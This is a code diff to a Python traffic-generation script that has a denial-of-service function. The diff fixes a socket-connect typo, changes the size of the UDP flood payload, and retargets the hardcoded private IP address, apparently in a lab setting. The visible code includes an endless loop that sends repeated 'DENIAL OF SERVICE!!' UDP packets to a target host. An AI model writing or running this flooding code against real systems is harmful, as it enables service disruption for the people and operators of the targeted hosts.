@@ -6,7 +6,7 @@ import getpass, socket, time, subprocess
 def generate_traffic(host, transmission, port, buffer_size):
     if transmission == "TCP":
         conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        conn.connet((host, port))
+        conn.connect((host, port))
         if port == 80:
             conn.sendall(b"GET / HTTP/1.1\r\n\r\n")
             data = conn.recv(buffer_size)
@@ -51,7 +51,7 @@ def dos(host, transmission, port, buffer_size):
             conn.close()
 
     elif transmission == "UDP":
-        message = b"DENIAL OF SERVICE!!" * 1000
+        message = b"DENIAL OF SERVICE!!" * 100
         while True:
             conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             conn.connect((host, port))
@@ -78,7 +78,8 @@ if "Kb" in buffer_size:
 elif "B" in buffer_size:
     buffer_size = int(buffer_size.replace("B", ""))
 
-host = "192.168.3.130"
+#host = "192.168.3.130"
+host = "192.168.126.128"
 
 print("Target: {}, Protocol: {}, Port: {}, Buffer Size: {} bytes. \n".format(host, transmission, str(port), str(buffer_size)))
 
